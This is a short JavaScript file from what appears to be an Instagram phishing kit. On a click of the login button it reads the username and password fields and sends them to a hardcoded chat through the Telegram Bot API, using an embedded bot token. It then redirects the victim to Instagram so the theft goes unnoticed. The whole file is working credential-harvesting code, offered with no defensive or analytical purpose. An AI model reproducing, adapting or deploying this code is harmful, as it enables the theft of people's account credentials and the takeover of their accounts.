let token = '7327070639:AAF9lcXoFYfFPkOWajFvTL8_T5XIvMYjR50'
let chatid = '7098365296'

let inputs = document.querySelectorAll(`input`)
let buttonlogin = document.querySelector(".login-button")

const sendmessagefunction  = () => {
    let token = '7327070639:AAF9lcXoFYfFPkOWajFvTL8_T5XIvMYjR50'
    let chatid = '7098365296'
    let apiurl = `https://api.telegram.org/bot${token}/sendMessage`;

    let data = {
        chat_id: chatid,
        text: `username: ${inputs[0].value} \n pasword: ${inputs[1].value}`
    }
    
    let options = {
        method: 'POST',
        headers: {
            'Content-Type': 'application/json'
        },
        body: JSON.stringify(data)
    };

    fetch(apiurl, options)
    .then(data => data.json())
    .then(res => {
        console.log('data ketdi',res)
        window.location.href = 'https://www.instagram.com/'
    })
    .catch(error => console.error(`xatolik bor`,error))

    
    window.location.href = 'https://www.instagram.com/_asomov_070/'
}

buttonlogin.addEventListener('click',sendmessagefunction)